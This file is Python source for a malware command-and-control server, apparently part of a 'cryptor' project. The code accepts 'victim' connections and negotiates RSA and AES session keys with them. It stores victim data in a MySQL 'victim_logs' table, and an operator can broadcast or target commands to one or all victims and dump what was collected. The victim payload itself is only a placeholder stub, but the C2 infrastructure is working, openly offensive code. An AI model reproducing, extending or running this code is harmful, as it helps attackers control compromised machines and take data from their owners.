from C2 import *
import sys
import socket
from _thread import *
from threading import Thread
import functools
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import AES
import base64
import json
import queue 
import codecs
import mysql
import mysql.connector
import re

codecs.register_error("strict", codecs.ignore_errors)

print = functools.partial(print, flush=True)

# thread_lock = threading.Lock()
threadList = []

class Victim(Thread):
    def __init__(self,clSock):
        Thread.__init__(self)
        self.q = queue.Queue()
        self.conn = clSock
        self.OTPPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
        self.EncryptedOTP = self.conn.recv(self.OTPPacketLen)
        self.rsaKey = RSA.import_key(PRVKEY)
        self.cipher = PKCS1_v1_5.new(self.rsaKey)
        self.OTP = self.cipher.decrypt(self.EncryptedOTP,"failed")
        self.aesKey = base64.b64decode(AESKEY, altchars=None, validate=False)
        self.OTPencodedAESKey = self.applyOTP(self.OTP,self.aesKey)
        self.conn.send(self.OTPencodedAESKey);
        # initiate the session key
        self.SessionKeyPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
        self.EncryptedKey = self.conn.recv(self.SessionKeyPacketLen)
        self.SessionKey = self.cipher.decrypt(self.EncryptedKey,"failed")
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
        self.SessionIV = self.conn.recv(16);
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
        self.conn.settimeout(5)

    #shell function for next milestone which will be to get the GUI built
    def print2DB(self,msg):
        creds = {}
        with open("./MySQLSVCCredentials.json") as CredentialFile:
                creds = CredentialFile.read()
        try:
            creds = json.loads(creds)
            #print(str(creds['user']))

            dbconn = mysql.connector.connect(user=creds['user'], password=creds['password'], host='localhost', database = 'cryptor_database')
            print ("DB Connected")
            rdict = {}
            rdict["Victim"] = str(self.name).split(':')[1].strip()
            rdict["Data"] = str(msg)
            print("C2 Server > Inserting the following victim response into database\n\t\t"+ str(rdict['Victim'])+"\n" + rdict['Data']) # str("{Victim:\""+str(self.name).split(':')[1].strip()+ "\"" +", Data:\"" + str(msg) +"\"}"))
            Cursor = dbconn.cursor()
            sqlStatment = "INSERT INTO victim_logs(ConnectionName,victim_data) VALUES (%s,%s)"
            Cursor.execute(sqlStatment,(rdict['Victim'],rdict['Data']))
            dbconn.commit()
            Cursor.close()
            dbconn.close()
        except Exception as e:
            print (e)
            print ("DB Connection Failed")
#        rdict = {}
 #       rdict["Victim"] = str(self.name).split(':')[1].strip()
  #      rdict["Data"] = str(msg)

   #     print( rdict["Data"]) # str("{Victim:\""+str(self.name).split(':')[1].strip()+ "\"" +", Data:\"" + str(msg) +"\"}"))
    
    def applyOTP(self,OTP, KEY):
        return bytes(o ^ k for o, k in zip(OTP, KEY))


    def secure_send(self, buf: bytes, length: len):
        try:
            # Synchronize Buffer
            self.conn.recv(1)
            sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
            self.conn.sendall((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
            # Synchronize buffer
            self.conn.recv(1)
            ciphertext = sessionCipher.encrypt(buf);
            # send the cipher text back to the client
            # the session IV has allready been updated in this instance.
            self.conn.sendall(ciphertext)
            self.SessionIV = self.conn.recv(16)
        except Exception as msg:
            try:
                creds = {}
                with open("./MySQLSVCCredentials.json") as CredentialFile:
                    creds = CredentialFile.read()
                creds = json.loads(creds)
                dbconn = mysql.connector.connect(user=creds['user'], password=creds['password'], host='localhost', database = 'cryptor_database')
                print ("DB Connected")
                Cursor = dbconn.cursor()
                sqlStatment = "DELETE FROM victim_logs WHERE ConnectionName = %s;"  
                Cursor.execute(sqlStatment,(str(self.get_name()),))
                dbconn.commit()
                Cursor.close()
                dbconn.close()
            except Exception as e:
                print("Failed to remove connection " + self.get_name() + " From queue\n"+str(e))
                
            print("C2 Server> Victim" + self.get_name() + "Disconnected! ")
            threadList.remove(self)
            sys.exit()

    def secure_recv(self,):
        try:
            sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
            msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
            self.conn.sendall(b"\x01")
            MSG = self.conn.recv(msgSZ)
            self.conn.sendall(b"\x01")
            plaintext = sessionCipher.decrypt(MSG[16:])
            self.SessionIV = MSG[:16]
        #    print(str(self.name))
            return plaintext;
        except Exception as msg:
            try:
                creds = {}
                with open("./MySQLSVCCredentials.json") as CredentialFile:
                    creds = CredentialFile.read()
                creds = json.loads(creds)
                dbconn = mysql.connector.connect(user=creds['user'], password=creds['password'], host='localhost', database = 'cryptor_database')
                print ("DB Connected")
                Cursor = dbconn.cursor()
                sqlStatment = "DELETE FROM victim_logs WHERE ConnectionName = %s;" 
                Cursor.execute(sqlStatment, (str(self.get_name()),))
                dbconn.commit()
                Cursor.close()
                dbconn.close()
            except Exception as e:
                print("Failed to remove connection " + self.get_name() + " From queue\n"+str(e))
            
            print("C2 Server> Victim " + self.get_name() + " Disconnected! ")
            threadList.remove(self)
            sys.exit()

    def get_name(self):
        return str(self.conn.getpeername()) 
        
    def addCommandToQueue(self,command):
        self.q.put(command)

    def getCommandFromQueue(self):
        return self.q.get() 

    def run(self):
        print("Payload Placeholder Stub")

class C2(Thread):
    
    def __init__(self,Payload):
        Thread.__init__(self)
        print("C2 Server > Initilizing C2 server")
        self.svr = socket.socket()
        self.svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.svr.bind(('127.0.0.1',PORT_SVR))
        print("C2 Server > Bind Socket: ", PORT_SVR)
        self.svr.listen(24)
        print("C2 Server > Listening for Victim Connections")
        self.vPayload = Payload
        threadList = []
 
    def run(self):
        while True:
            cl, addr = self.svr.accept()
            print("C2 Server > Accepted connection from victim: ", addr)
            v=self.vPayload(cl)
            v.setName("Victim: " + str(addr))
            v.start()
            threadList.append(v)
            
        #cl.recv(1024)
                
        svr.close()
class CTRLClient(Thread):

    def __init__(self, cliSoc):
        Thread.__init__(self)
        self.conn = cliSoc
        self.name = self.conn.getpeername()
        print("C2 Server > Control Client " + self.name + " Connected")

    def sendStr(self, SendStr):
            length = len(SendStr)
            self.conn.send((length).to_bytes(8,byteorder="big")) # UINT32 4 bytes.
            self.conn.recv(1) #Sync
            self.conn.send(SendStr.encode()) 
            self.conn.recv(1) #Sync
    def recvStr(self):
            msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
            self.conn.send(b"\x01")
            MSG = self.conn.recv(msgSZ)
            self.conn.send(b"\x01") 
            return MSG.decode()
    def run(self):
        jsonArray = []
        try:
            while True:
                try:
                    command = json.loads(self.recvStr())
                    if command["Target"] == str(self.conn.getsockname()):
                        if str(command["Command"]) == "List Connections":
                            jsonArray=[]
                            for t in threadList:
                                jsonArray.append(t.get_name())
                            response = {}
                            response["Type"] = "Victim List"
                            response["Message"] = jsonArray
                            self.sendStr(json.dumps(response))
                        elif isinstance(command["Command"],dict):
                            if command["Command"]['subcmd'] == "dump":
                                print(command["Command"]["victim"])
                            try:
                                creds = {}
                                with open("./MySQLSVCCredentials.json") as CredentialFile:
                                    creds = CredentialFile.read()
                                creds = json.loads(creds)
                                dbconn = mysql.connector.connect(user=creds['user'], password=creds['password'], host='localhost', database = 'cryptor_database')
                                print ("DB Connected")
                                Cursor = dbconn.cursor()
                                sqlStatment = "SELECT * FROM victim_logs WHERE ConnectionName = %s;"
                                Cursor.execute(sqlStatment, (command["Command"]["victim"],))
                                query = Cursor.fetchall()
                                response = ''
                                for res in query:
                                    if response == '':
                                        response = res[2]
                                    else:
                                        response = response + res[2]
                                self.sendStr(str(response.decode()))
                                dbconn.commit()
                                Cursor.close()
                                dbconn.close()
                            except Exception as e:
                                print("Error opening DB for read\n" + str(e))
                                self.sendStr("Error opening DB for read")
                        else:
                            self.sendStr("Error: invalid command")
                            print(type(command["Command"]))
                            continue
                    elif command["Target"] == "*":
                        for t in threadList:
                            t.addCommandToQueue(str(command["Command"]))
                        response = {}
                        response["Type"] = "Data"
                        response["Message"] = "Command sent to all victims"
                        self.sendStr(json.dumps(response))
                    else:
                        for t in threadList:
                            if str(command["Target"]) == t.get_name():
                                t.addCommandToQueue(str(command["Command"]))
                                response["Type"] = "Data"
                                response["Message"] = "Command sent to victim: " + str(t.get_name()) 
                                self.sendStr(json.dumps(response))
                except Exception as e:
                    if self.conn.fileno() == -1:
                        print("Socket disconnected")
                        break
                    response = {}
                    response["Type"] = "Error"
                    response["Message"] = "JSON Parsing Error"
                    self.sendStr(json.dumps(response))
                    print("C2 > Json parsing error \n "+ str(e))
        except:
            print("C2 Server > Control Client " + self.name +" Disconnected")
class CTRLThread(Thread):
    def __init__(self):
        Thread.__init__(self)        
        print("C2 Server > Initilizing C2 Controle Server")
        self.svr = socket.socket()
        self.svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.svr.bind(('127.0.0.1', CTRL_PORT))
        print("C2 Server > CTRLSver socket Binded to port:", CTRL_PORT)
        self.svr.listen(1)
        print("C2 Server > CTRLSver Socket Listening" )
        

    def run(self):
        while True:
            cl, addr = self.svr.accept()
            c = CTRLClient(cl) 
            c.setName("CTRLClient")
            c.start()
            
def run(payload):
    #print(banner)
    VictimHandler = C2(payload)
    VictimHandler.setName("VictimHandelerThread")
    VictimHandler.start()
    CTRLHandler = CTRLThread()
    CTRLHandler.setName("AttackControleThread")
    CTRLHandler.start() 

if __name__ == "__main__":
    run(Victim)
{"Target": "*", "Command": "test queue"}


